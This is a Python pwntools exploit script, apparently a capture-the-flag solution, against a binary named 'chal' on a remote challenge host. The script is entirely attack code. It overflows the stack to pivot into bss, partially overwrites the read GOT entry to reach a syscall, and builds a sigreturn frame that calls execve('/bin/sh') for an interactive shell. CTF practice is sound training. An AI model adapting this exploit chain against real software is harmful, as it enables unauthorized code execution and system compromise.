from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./chal"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("challenge.secso.cc", 8003)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


bss = 0x0404000
main = 0x40114B
# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

payload = b"a" * 0xc
payload += p64(bss + 0x800)
payload += p64(main)
io.sendline(payload)
pause()

payload = b"a" * 0xc
payload += p64(bss + 0x900)
payload += p64(main)

io.sendline(payload)
pause()
"""
0x000000000040111d : pop rbp ; ret
0x000000000040113a : pop rsi ; ret
0x000000000040101a : ret
"""
pop_rsi = 0x000000000040113a
ret = 0x000000000040101a
read_got = elf.got["read"]
read_plt = elf.plt["read"]
frame = SigreturnFrame()
frame.rdi = 0x4048f4
frame.rsi = 0
frame.rdx = 0
frame.rax = constants.SYS_execve
frame.rsp = read_got
frame.rip = ret

payload = b"/bin/sh\x001111"
payload += p64(bss + 0x700)
payload += p64(pop_rsi)
payload += p64(read_got - 14)
payload += p64(read_plt) # read最后一个字节改为0x98
payload += p64(read_plt) # srop走起
payload += bytes(frame)
log.success("read :-----> " + hex(libc.symbols["read"]))
log.success(disasm(bytes(frame)))
ddebug("break *0x0401169\n continue")
io.sendline(payload)
pause()

io.send(b"a" * 14 + b"\x98")
io.interactive()
